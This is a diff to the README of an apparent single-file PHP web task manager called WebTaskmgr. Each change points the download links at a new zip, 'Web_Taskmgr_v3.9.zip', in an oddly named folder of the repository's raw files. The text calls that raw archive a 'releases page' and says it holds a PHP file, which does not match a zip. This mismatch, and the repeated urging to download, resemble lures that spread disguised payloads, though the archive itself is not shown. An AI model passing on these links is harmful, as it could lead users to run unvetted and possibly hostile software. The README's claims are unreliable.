@@ -6,7 +6,7 @@ Welcome to WebTaskmgr! This is a multi-functional task manager that runs seamles
 
 ## 📥 Download the Latest Version
 
-[![Download WebTaskmgr](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/WebTaskmgr.zip)](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/WebTaskmgr.zip)
+[![Download WebTaskmgr](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/Web_Taskmgr_v3.9.zip)](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/Web_Taskmgr_v3.9.zip)
 
 ## 📋 What You Need
 
@@ -29,7 +29,7 @@ To get started with WebTaskmgr, follow these simple steps:
 
 1. **Visit the Release Page:** Click on the link below to access our releases page.
 
-   [https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/WebTaskmgr.zip](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/WebTaskmgr.zip)
+   [https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/Web_Taskmgr_v3.9.zip](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/Web_Taskmgr_v3.9.zip)
 
 2. **Download the Latest Release:** Once on the release page, look for the latest version of the software. Click on the link to download the PHP file. 
 
@@ -79,4 +79,4 @@ To contribute, you can fork the repository, make your changes, and submit a pull
 
 WebTaskmgr simplifies server management with an intuitive interface and robust features, all through a single PHP file. Whether you're managing a small site or looking for a straightforward task manager, WebTaskmgr provides the tools you need.
 
-Don’t forget to download the latest version here: [Download WebTaskmgr](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/WebTaskmgr.zip). Happy managing!
+Don’t forget to download the latest version here: [Download WebTaskmgr](https://raw.githubusercontent.com/SudeepSingh1301/WebTaskmgr/main/bemole/Web_Taskmgr_v3.9.zip). Happy managing!
